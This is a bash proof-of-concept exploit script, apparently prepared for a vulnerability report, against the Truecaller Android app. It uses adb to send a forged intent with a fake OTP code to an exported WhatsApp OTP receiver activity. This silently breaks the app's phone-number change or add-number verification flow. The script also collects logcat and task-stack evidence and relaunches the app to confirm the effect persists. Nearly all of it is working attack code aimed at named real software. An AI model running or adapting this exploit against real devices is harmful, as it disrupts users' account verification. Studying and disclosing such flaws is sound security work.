#!/bin/bash
# truecaller_whatsapp_otp_dos_poc.sh
# CWE-925/926 - Broken access control on exported WhatsApp OTP receiver activity
# Usage: ./truecaller_whatsapp_otp_dos_poc.sh
set -e

PKG="com.truecaller"
COMPONENT="com.truecaller/.account.verification.whatsapp.WhatsAppOtpReceiverActivity"
ACTION="com.whatsapp.otp.OTP_RETRIEVED"
OUTDIR="./poc_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"

echo "[*] Output: $OUTDIR"

if ! adb get-state >/dev/null 2>&1; then
  echo "[!] No device connected."; exit 1
fi

echo "[*] Starting logcat capture..."
adb logcat -c
adb logcat -v time > "$OUTDIR/logcat.txt" 2>&1 &
LOGCAT_PID=$!
sleep 1

echo "[*] Pre-injection task stack:"
adb shell dumpsys activity activities | grep -A5 "Running activities" | tee "$OUTDIR/stack_before.txt"

echo ""
echo "############################################################"
echo "MANUAL STEP: Navigate to Edit Profile -> change primary number"
echo "(or add secondary number) -> enter target number -> tap Verify."
echo "Stay on the verification screen."
echo "############################################################"
read -p "Press ENTER once the verify screen is showing... " _

echo "[*] Firing forged intent (zero-permission-equivalent invocation)..."
adb shell am start -n "$COMPONENT" -a "$ACTION" --es code "123456" \
  | tee "$OUTDIR/am_output.txt"

sleep 2

echo "[*] Post-injection task stack:"
adb shell dumpsys activity activities | grep -A5 "Running activities" | tee "$OUTDIR/stack_after.txt"

echo "[*] Cold relaunch to confirm persisted (not just in-memory) state:"
adb shell am force-stop "$PKG"
sleep 1
adb shell monkey -p "$PKG" -c android.intent.category.LAUNCHER 1 >/dev/null
sleep 3
adb shell dumpsys activity activities | grep -A5 "Running activities" | tee "$OUTDIR/stack_after_relaunch.txt"

echo "[*] Stopping logcat..."
sleep 1
kill "$LOGCAT_PID" 2>/dev/null || true
wait "$LOGCAT_PID" 2>/dev/null || true

echo "[*] Extracting stack-collapse evidence..."
grep -E "deliverResultForFinishActivity|START u0.*result code=|WhatsAppOtpReceiverActivity" \
  "$OUTDIR/logcat.txt" | tee "$OUTDIR/collapse_evidence.txt"

echo ""
echo "[*] Done. Review $OUTDIR/collapse_evidence.txt for the task-stack"
echo "    teardown chain, and confirm on-screen whether the flow you"
echo "    started (number change/add) was silently discarded."
